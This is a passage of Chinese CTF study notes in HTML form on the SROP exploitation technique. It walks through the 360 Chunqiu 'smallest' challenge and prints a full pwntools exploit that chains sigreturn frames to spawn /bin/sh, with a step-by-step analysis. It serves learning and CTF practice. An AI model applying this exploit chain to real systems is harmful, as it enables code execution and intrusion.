+<a name="2gd2vt1tnltclvv1uisp3qmsbq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/6a7cfsl161jhcgjol4o14begdb.png"></p>
+<h3 class="topic">
+<a name="7mf3q21kfnofqesp42i2bb80fi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7pbu0d896m6t7ba1r5l58lirgm.png"></p>
+<h3 class="topic">
+<a name="7jbb0jle09autf1kn0dftr1ebt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsyscall已经被vsyscall-emulate和vdso机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。</a>
+</h3>
+<h3 class="topic">
+<a name="20qgh314tnn72fpkpf3t11aimu">&nbsp;&nbsp;&nbsp;关于sigreturn系统调用</a>
+</h3>
+<h3 class="topic">
+<a name="6pvdgs9t474kj4lgave3hedgtc">&nbsp;&nbsp;&nbsp;&nbsp;sigreturn本身就是一个系统调用，所以也可以使用sysycall(int 0x80)+系统调用号的方式进行调用，32位的sigreturn的调用号为77，64位的系统调用号为15。所以在程序中寻找sigreturn的问题可以转换为 寻找int 0x80的地址和如何将rax赋值为调用号的问题</a>
+</h3>
+<h3 class="topic">
+<a name="5scjudeu5c3nnmnsukecnl0q1k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一般rax用于存放函数返回值，如果调用read函数，该函数返回值为传输数据的字节数，通过传输指定字节个数据，从而给rax赋值</a>
+</h3>
+<h3 class="topic">
+<a name="7r48sahijieg850kon4ffclbk7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/24f104g45492ip9b2ir25kku9s.png"></p>
+<h3 class="topic">
+<a name="1nr3pfcr38ljo25b6qp7925k82">&nbsp;&nbsp;&nbsp;SROP攻击的重点</a>
+</h3>
+<h3 class="topic">
+<a name="6k412lpmpd2ojojch51o05kura">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7rkich7b2prjp2qu48unp8d70b.png"></p>
+<h3 class="topic">
+<a name="6ugn7dv4anr49pat1sbgdisnf8">&nbsp;&nbsp;&nbsp;SROP应用场景</a>
+</h3>
+<h3 class="topic">
+<a name="0iatqh8h0r9ut7733d5tssk0gd">&nbsp;&nbsp;&nbsp;&nbsp;后门</a>
+</h3>
+<h3 class="topic">
+<a name="1hsaj0t8e45f7v7h00c2dthvje">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/5q38papsodps6ep485h9amng8b.png"></p>
+<h3 class="topic">
+<a name="51c9utmb7fbpmhvvf06pq1kpgf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;系统调用代理</a>
+</h3>
+<h3 class="topic">
+<a name="457c3rddffgtrn0h926c9kqch2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1kva1a5eag7i4ms6outv14su5e.png"></p>
+<h3 class="topic">
+<a name="7i8ckbplk3uf8juf3mm17cg812">&nbsp;&nbsp;&nbsp;SROP的防范</a>
+</h3>
+<h3 class="topic">
+<a name="5us5nbt17qhd3mqeeu40k1b2ak">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/0o5ta2rik6t9p8t7feb3jmkcgi.png"></p>
+<h3 class="topic">
+<a name="7t1q0nog3kcbl1jgrhl2ehmvj7">&nbsp;&nbsp;&nbsp;SROP的攻击方式已经被集成到pwntools、binjitsu中</a>
+</h3>
+<h3 class="topic">
+<a name="1ps8ea5n1qbr19k6fghn394p45">&nbsp;&nbsp;&nbsp;&nbsp;https://binjitsu.readthedocs.io/</a>
+</h3>
+<h3 class="topic">
+<a name="3c809696bv4frahhl1libs5k0l">&nbsp;&nbsp;&nbsp;相关资料</a>
+</h3>
+<h3 class="topic">
+<a name="78tnn4nvi8gulk1bko69cfsqms">&nbsp;&nbsp;&nbsp;&nbsp;https://www.freebuf.com/articles/network/87447.html</a>
+</h3>
+<h3 class="topic">
+<a name="2v0430i5h4hftqjn8f0rjulccd">&nbsp;&nbsp;&nbsp;&nbsp;https://binjitsu.readthedocs.io/</a>
+</h3>
+<h3 class="topic">
+<a href="https://blog.csdn.net/luozhaotian/article/details/79608220" name="1tpkhphuas23q609ku2k1ra6sg">&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/luozhaotian/article/details/79608220</a>
+</h3>
+<h3 class="topic">
+<a href="https://www.jianshu.com/p/b838a10b63c7" name="1tu7bk34nnfco584ppjoj0u6am">&nbsp;&nbsp;&nbsp;&nbsp;https://www.jianshu.com/p/b838a10b63c7</a>
+</h3>
+<h3 class="topic">
+<a name="1bk8oe4hh9dhuucsqlgrshjbsr">&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/qq_29343201/article/details/72627439</a>
+</h3>
+<h3 class="topic">
+<a name="5mtbn7e0k8to107qnm06v4ancc">&nbsp;&nbsp;&nbsp;&nbsp;https://www.por7er.com/linux-srop.html</a>
+</h3>
+<h3 class="topic">
+<a name="5h8qm6cunsc2jrk6u17ur3ejku">&nbsp;&nbsp;&nbsp;&nbsp;https://github.com/bash-c/pwn_repo/tree/master/360ChunQiu2017_smallest</a>
+</h3>
+<h3 class="topic">
+<a name="40m6ig9kfb8ltb8ud6ora3f011">&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/luozhaotian/article/details/79607572</a>
+</h3>
+<h3 class="topic">
+<a name="33bs1qcnaafs6a3qfc2l2rnhoh">&nbsp;&nbsp;&nbsp;&nbsp;https://www.anquanke.com/post/id/85810</a>
+</h3>
+<h3 class="topic">
+<a name="0hh2hqtvqbpaegmktnpvptmnna">&nbsp;&nbsp;&nbsp;例题</a>
+</h3>
+<h3 class="topic">
+<a name="20qiibmqkr3mnv28jc1ohkt02g">&nbsp;&nbsp;&nbsp;&nbsp;程序中main函数的原型以及其参数的存储</a>
+</h3>
+<h3 class="topic">
+<a name="3djkh8qpvtslj20hrah8d6mvvq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;main函数可能的形式</a>
+</h3>
+<h3 class="topic">
+<a name="4pvuknmbgbp55ob6m28bvk1vjt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int main(void) </a>
+</h3>
+<h3 class="topic">
+<a name="4g6a9im118aeepqlmh4hdcshri">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int main(int argc,char * argv[])</a>
+</h3>
+<h3 class="topic">
+<a name="0tefkl239qiaem8d2b3hjjdh2m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int main(int argc,char* argv[],char * envp[])</a>
+</h3>
+<h3 class="topic">
+<a name="1td35t6mj8kgtkd6hoa81ds8bi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据资料可以知道，main函数实际上可以有三个参数</a>
+</h3>
+<h3 class="topic">
+<a name="7vp7fve1k72dtccoplb9asp2os">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;argc用于用于表示程序执行时参数的个数，一般程序名称本身算一个参数，例如 linux中执行  ./a.out a b c，argc为4</a>
+</h3>
+<h3 class="topic">
+<a name="2dfudgc0l57038onepl3cio2um">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;argv[]是一个指针数组，其数组元素就是指向参数字符串的指针，其中第一个数组元素为程序名称字符字符串的指针，最后一个元素为NULL，标识argv的结束</a>
+</h3>
+<h3 class="topic">
+<a name="7324goevgfirvs624382qkhh58">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;envp[]是一个指针数组，数组元素为环境变量字符串的指针</a>
+</h3>
+<h3 class="topic">
+<a name="3bfs50lh86ret2tq4laj5n445r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/23ic6uu1f19v3aij8lr8jal6ma.png"></p>
+<h3 class="topic">
+<a name="3656h7aj6a8l3hl85q9q35e3me">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;main函数的三个参数均保存在栈中</a>
+</h3>
+<h3 class="topic">
+<a name="3vbrs4jqt0bomuct641b8llhnm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="10eltnhn0eba1m4rraie29l1pv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;示例程序为打印mian函数的参数以及环境变量</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/303p4500rru9mb74i5bbbmndml.png"></p>
+<h3 class="topic">
+<a name="5jb5eq0k3scrtgvib7b5kn30df">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用gcc test.c -static 将源代嘛编译成a.out，然后执行可以发现，程序将参数字符串和环境变量打印出来了</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1ntjo7ehim3ilofc89dj7gao4p.png"></p>
+<h3 class="topic">
+<a name="6vb5bnnlrn0jnmkkuqnmf2qhpa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当为a.out的执行添加参数1 2 3之后，a.out会将四个参数（一个程序名称，三个参数）打印出来，并且打印出环境变量</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4qsff29s2qjbko6s7ka90gjf4u.png"></p>
+<h3 class="topic">
+<a name="5p3m0g61n2pp7gsmufilj3igu1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;调试带参数调用的a.out</a>
+</h3>
+<h3 class="topic">
+<a name="0g1k0kenuoi4dchrnr58203npv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序断在系统断点</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/0fack2ppi8rb64jd3gng354uii.png"></p>
+<h3 class="topic">
+<a name="3a9qpbmpsg1fkrf2lbfbfe71if">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看程序栈中的数据，发现agrc argv[] envp[]均保存在栈中，并且函数参数字符串和环境变量字符串也保存在一段连续的内存空间中</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2l789o2s81kh8djv6t3lrjh81q.png"></p>
+<h3 class="topic">
+<a name="5oagne2r3jceafvep5jtvl4ul1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到栈中保存的参数字符串数据</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/5uv5k99o1fivnqr770c83cqemh.png"></p>
+<h3 class="topic">
+<a name="7lvpiu5vfnev46gsag2t16cclv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;agrc argv[] envp[]数据并不位于栈顶，可能由于程序在将mian函数参数保存到栈上之后还运行了许多其他函数，因为栈是从内存高地址向内存低地址发展的，所以栈中位于高内存地址的数据是在程序运行周期中更早发挥作用的</a>
+</h3>
+<h3 class="topic">
+<a name="3meec1qrg3402i2v971hltn2hq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;调试360春秋杯中的smallest-pwn的smallest文件，因为其比较简单，当程序断在系统断点，此时栈顶就保存这argc argv[] envp[]</a>
+</h3>
+<h3 class="topic">
+<a name="310g2ei5vn6iemvvlbr9fh01g4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2llqvj5n0fpn248miskun9bseh.png"></p>
+<h3 class="topic">
+<a name="5ll15qrk0coktui722qetahidt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;相关资料</a>
+</h3>
+<h3 class="topic">
+<a name="34bjecv3m500tkh2vi6pe6u3qe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;深入l理解计算机系统</a>
+</h3>
+<h3 class="topic">
+<a name="2fb0h4836fu3mi40kimhmh39iv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://www.linuxidc.com/Linux/2011-03/33764.htm</a>
+</h3>
+<h3 class="topic">
+<a name="3ovo95dtvm0qmvirg5o7gno8pf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://bbs.csdn.net/topics/391843364</a>
+</h3>
+<h3 class="topic">
+<a name="705hh0jsq5u2us548e0jagkcfh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/dgreh/article/details/80985928</a>
+</h3>
+<h3 class="topic">
+<a href="https://blog.csdn.net/kangear/article/details/78521551?locationNum=4&amp;fps=1" name="3e18mjmr6ru3qqh2c7n7fbbd0j">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/kangear/article/details/78521551?locationNum=4&amp;fps=1</a>
+</h3>
+<h3 class="topic">
+<a href="https://blog.csdn.net/xiaoyaohuqijun/article/details/51695551" name="0tci63d2jmqdehl14a601pfvoc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/xiaoyaohuqijun/article/details/51695551</a>
+</h3>
+<h3 class="topic">
+<a name="6nqihiki0kkde4lngfi0oe3bq6">&nbsp;&nbsp;&nbsp;&nbsp;360春秋杯中的smallest-pwn</a>
+</h3>
+<h3 class="topic">
+<a name="6hur62b6fq7mdo792j6jk8ojlk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IDA分析问文件内容</a>
+</h3>
+<h3 class="topic">
+<a name="7aok782n0fg0n4uu9084dpeaaq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7h428ku7mds1cm2l0qe56l205a.png"></p>
+<h3 class="topic">
+<a name="654vevnq8t578ujevqvq613ood">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据ida，程序其实就这几行代码 因为read函数对应的函数调用号为0，所以以上汇编指令实际上执行了read(0,rsp,400h)即将400h的数据写到栈顶为首地址的内存空间</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/2jkd00s8fl9poiv4bsnqfuo3f6.png"></p>
+<h3 class="topic">
+<a name="08sv2bajh8ifs52v16hgjisda2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文件属性与保护机制</a>
+</h3>
+<h3 class="topic">
+<a name="2tdugg50tfjc1lmgme7jebtuap">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/4654sar4b35kchn32imb0qmdjb.png"></p>
+<h3 class="topic">
+<a name="674io2v36h74c2hi9ij7e46qta">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;64位静态链接文件</a>
+</h3>
+<h3 class="topic">
+<a name="36lk8f543e15fdacdgll1vpitq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1nti74f62681oca59b1v9iqpq8.png"></p>
+<h3 class="topic">
+<a name="5pht3jv00336134d1uu7akg63r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="1n0e5p34us5ud3h08tnnfvuutn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn</a>
+</h3>
+<h3 class="topic">
+<a name="03qc5hi54d58b3e37ljpadkf0l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过syscall执行execve("/bin/sh",0,0)来获取shell。</a>
+</h3>
+<h3 class="topic">
+<a name="36k94m9ut0q1cn3aim4qr3iac9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用程序分析</a>
+</h3>
+<h3 class="topic">
+<a name="33cevqirpird3u4koajjnvgc44">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#coding:utf-8&#13;
+from pwn import *&#13;
+import time&#13;
+context.log_level = 'debug'&#13;
+context.arch = "amd64"&#13;
+exe = './smallest'&#13;
+s = process(exe)&#13;
+ &#13;
+main_addr = 0x4000b0&#13;
+syscall_addr = 0x4000be&#13;
+write_payload = p64(main_addr) + p64(main_addr) + p64(main_addr)&#13;
+#三次main_addr是为了后面构造三次跳转&#13;
+s.send(write_payload)&#13;
+&#13;
+s.send("\xb3") # set rax=1  执行write函数，同时返回地址改写为0x4000b3。 跳过 xor %rax,%rax 使rax保持为1&#13;
+&#13;
+stack_addr = u64(s.recv()[8:16])#接收到的第8个字节开始才是我们所需要的栈地址&#13;
+print "stack:"+hex(stack_addr)&#13;
+&#13;
+&#13;
+frame = SigreturnFrame(kernel="amd64")&#13;
+frame.rax = constants.SYS_read&#13;
+frame.rdi = 0x0&#13;
+frame.rsi = stack_addr&#13;
+frame.rdx = 0x400&#13;
+frame.rsp = stack_addr&#13;
+frame.rip = syscall_addr&#13;
+# frame代表read(0,stack_addr,0x400)  &#13;
+&#13;
+# 现将Payload写到栈上&#13;
+read_frame_payload = p64(main_addr) + p64(0) + str(frame)&#13;
+s.send(read_frame_payload)&#13;
+ &#13;
+# 通过控制输入的字符数量，调用sigreturn&#13;
+goto_sigreturn_payload = p64(syscall_addr) + "\x00"*(15 - 8)&#13;
+ # sigreturn syscall is 15 &#13;
+s.send(goto_sigreturn_payload)&#13;
+ &#13;
+&#13;
+frame = SigreturnFrame(kernel="amd64")&#13;
+frame.rax = constants.SYS_execve&#13;
+frame.rdi = stack_addr+0x150 # "/bin/sh" 's addr &#13;
+frame.rsi = 0x0&#13;
+frame.rdx = 0x0&#13;
+frame.rsp = stack_addr&#13;
+frame.rip = syscall_addr&#13;
+&#13;
+execv_frame_payload = p64(main_addr) + p64(0) + str(frame)&#13;
+execv_frame_payload_all = execv_frame_payload + (0x150 - len(execv_frame_payload))*"\x00" + "/bin/sh\x00"&#13;
+s.send(execv_frame_payload_all)&#13;
+ &#13;
+s.send(goto_sigreturn_payload)  &#13;
+ &#13;
+s.interactive()</a>
+</h3>
+<h3 class="topic">
+<a name="4dc4a6kohj30g299kp8fr7rc67">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分段分析</a>
+</h3>
+<h3 class="topic">
+<a name="4cr3k445gup5g4jfmqoo6nmkkg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;main_addr = 0x4000b0&#13;
+syscall_addr = 0x4000be&#13;
+write_payload = p64(main_addr) + p64(main_addr) + p64(main_addr)&#13;
+#三次main_addr是为了后面构造三次跳转&#13;
+s.send(write_payload)</a>
+</h3>
+<h3 class="topic">
+<a name="5pcmlnks4kqusb6932dsn3j40i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据ida中的分析而可以知道0x00000000004000B0是整个程序的起始地址，而0x00000000004000BE是指令序列syscall ret的起始地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/0q7pue6toakn4gkntfe0t30g36.png"></p>
+<h3 class="topic">
+<a name="6q4pttalpvlf8ioivhjv3au6v3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序将三份程序起始地址写入栈顶，此时栈顶数据为</a>
+</h3>
+<h3 class="topic">
+<a name="7228gi4jm6pg4d7m9pjod1t9ar">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/5ms2loltqmmqvackskeh0tqtlp.png"></p>
+<h3 class="topic">
+<a name="4n2n7mk5ialbla6411ren4fggm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/1o3e8p75ak8l48aful61hujums.png"></p>
+<h3 class="topic">
+<a name="40thf2spa97bgs86e7d4a2cfaf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall执行read函数将三个main_addr写入栈中后，执行retn，此时rsp指向main_addr,所以程序返回起始位置继续执行（即从xor rax,rax开始）</a>
+</h3>
+<h3 class="topic">
+<a name="0c51n93j7o4304qldm1pl3dfb9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.send("\xb3") # set rax=1  执行write函数，同时返回地址改写为0x4000b3。 跳过 xor %rax,%rax 使rax保持为1&#13;
+&#13;
+stack_addr = u64(s.recv()[8:16])#接收到的第8个字节开始才是我们所需要的栈地址&#13;
+print "stack:"+hex(stack_addr)</a>
+</h3>
+<h3 class="topic">
+<a name="369ug0d0jhcbgje90gc96t4tbq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序返回到起始位置继续执行，栈顶弹出，rsp指向第二个mian_addr</a>
+</h3>
+<h3 class="topic">
+<a name="23mdvnmr5vqtjfjed13mcdg30d">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序继续执行read读入数据，此时向程序发送一字节数据，将该一字节数据写入rsp指向的内存空间，因为数据小端存储，所以此时rsp指向的数据从man_addr（0x4000B0）被修改为了0x4000B3，该内存地址在程序中为mov edx,400h正好越过了&#13;
+xor rax,rax</a>
+</h3>
+<h3 class="topic">
+<a name="6pdf2juq9aff98jlcqvblm2384">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/5vmdsfsu40sfvi47klt3nu39r4.png"></p>
+<h3 class="topic">
+<a name="01djbtf6g51ihbjdcr878p1utg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/7rfebmi6debso0poc3q9r8fudc.png"></p>
+<h3 class="topic">
+<a name="0p027gpk8uqedkrrn2rkq33i1p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当写入一字节数据完成，程序执行retn返回，返回地址为0x4000B3，因为越过了xor rax,rax所以rax并没有被清零，反而由于之前函数read写入一字节数据，所以rax为1，1正好时write函数的系统调用号，且1表示stdout，所以本次执行程序指令，相当于执行&#13;
+write(1,rsp,400h)</a>
+</h3>
+<h3 class="topic">
+<a name="49e89456uspmsbk5cn0knjdpjj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,rsp,400h)函数执行完成后会将第三个main_addr起始的栈数据进行输出，此时第三个main_addr之后保存着指向栈空间的指针，所以只要截取输出数据的8~16字节，就可以得到一个占内存地址，即代码中的stack_addr</a>
+</h3>
+<h3 class="topic">
+<a name="3u4gqedoa1qc25s9b10fh11rrp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write函数执行完毕后，执行retn函数，此时rsp指向第三个main_addr，所以函数返回起始位置再次执行&#13;
+read(0,rsp,400h)</a>
+</h3>
+<h3 class="topic">
+<a name="7m6nh2grihllom6qhjd0ip8s33">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;frame = SigreturnFrame(kernel="amd64")&#13;
+frame.rax = constants.SYS_read&#13;
+frame.rdi = 0x0&#13;
+frame.rsi = stack_addr&#13;
+frame.rdx = 0x400&#13;
+frame.rsp = stack_addr&#13;
+frame.rip = syscall_addr&#13;
+# frame代表read(0,stack_addr,0x400)  &#13;
+&#13;
+# 现将Payload写到栈上&#13;
+read_frame_payload = p64(main_addr) + p64(0) + str(frame)&#13;
+s.send(read_frame_payload)</a>
+</h3>
+<h3 class="topic">
+<a name="3pk8qfdd9dcor5bl46vqscpnci">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时使用pwntools提供的SigreturnFrame功能，构造一个用于执行read(0,stack_adddr,0x400)的SigreturnFrame，然后在其前部加上8字节的mian_addr和8字节的0，并将其作为一个整体进行输出，输入完成后哦，程序中栈的情况如右图</a>
+</h3>
+<h3 class="topic">
+<a name="0ht5j6se3eghs68eaqm7smtslv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/3pa794jdd8daf6dt5nrfql4t4s.png"></p>
+<h3 class="topic">
+<a name="7th28u9qsmnbgf81o608l187ee">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输入完成后，程序继续执行retn指令，此时rsp指向刚刚输入的main_addr,则程序返回到起始位置继续执行read，并等待输入</a>
+</h3>
+<h3 class="topic">
+<a name="39rncmn3k34lq36eggu1ue4gnh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 通过控制输入的字符数量，调用sigreturn&#13;
+goto_sigreturn_payload = p64(syscall_addr) + "\x00"*(15 - 8)&#13;
+ # sigreturn syscall is 15 &#13;
+s.send(goto_sigreturn_payload)</a>
+</h3>
+<h3 class="topic">
+<a name="35vp1hncu9qv08lg74snc7imlh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此次用户输入的是一个十五字节的数据，p64()将syscall_addr扩展为为8字节，后面跟上7字节的0x00,数据输入后程序栈如右图所示</a>
+</h3>
+<h3 class="topic">
+<a name="424monlh8hj238bepkrtk50epe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里存在一个问题，前一个步骤中，程序执行retn返回后，rsp下移指向p64(0),此时将15字节数据写入p64(0)为首的8字节内存空间，多余的7字节数据会淹没frame(read)中的数据，这不会破坏frame(read)从而影响后续read函数执行嘛？</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/64s2qfssav3futemifvtnjm54e.png"></p>
+<h3 class="topic">
+<a name="41jjdpe8h35ljaphp2rcof4pv4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个问题暂时放下，先假设不会影响</a>
+</h3>
+<h3 class="topic">
+<a name="0n9pu437nahpp1gvaernjhriu4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;会不会和pwmtools实现的SigreturnFrame的具体内存结构有关呢？？？</a>
+</h3>
+<h3 class="topic">
+<a name="1ii9td60u78g0o55cmn2mo75l8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输入15字节数据后程序rax被设置为15，此时read系统调用执行完毕，执行retn返回，此时返回地址为syscall_adr,且rax为15，程序会执行sigreturn系统调用，根据此时的frame(read)设置寄存器的值，当sigreturn系统调用执行完毕后，程序会执行read(0,stack_addr,0x400)  函数</a>
+</h3>
+<h3 class="topic">
+<a name="70e8fvvkpkg0mtdu8pefcrhrpl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有个问题，sigreturn系统调用以什么为依据寻找栈中的sigframe呢？怎么确定使用的一定就是我们给定的frame(read)????</a>
+</h3>
+<h3 class="topic">
+<a name="437ds2stdlbsn5rd8ugtqefoi2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;frame = SigreturnFrame(kernel="amd64")&#13;
+frame.rax = constants.SYS_execve&#13;
+frame.rdi = stack_addr+0x150 # "/bin/sh" 's addr &#13;
+frame.rsi = 0x0&#13;
+frame.rdx = 0x0&#13;
+frame.rsp = stack_addr&#13;
+frame.rip = syscall_addr&#13;
+&#13;
+execv_frame_payload = p64(main_addr) + p64(0) + str(frame)&#13;
+execv_frame_payload_all = execv_frame_payload + (0x150 - len(execv_frame_payload))*"\x00" + "/bin/sh\x00"&#13;
+s.send(execv_frame_payload_all)</a>
+</h3>
+<h3 class="topic">
+<a name="2lta4bp7v6in8oe3j4q00ahc0d">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/3h6pbg5t3ojhpbhu4jqr8skjps.png"></p>
+<h3 class="topic">
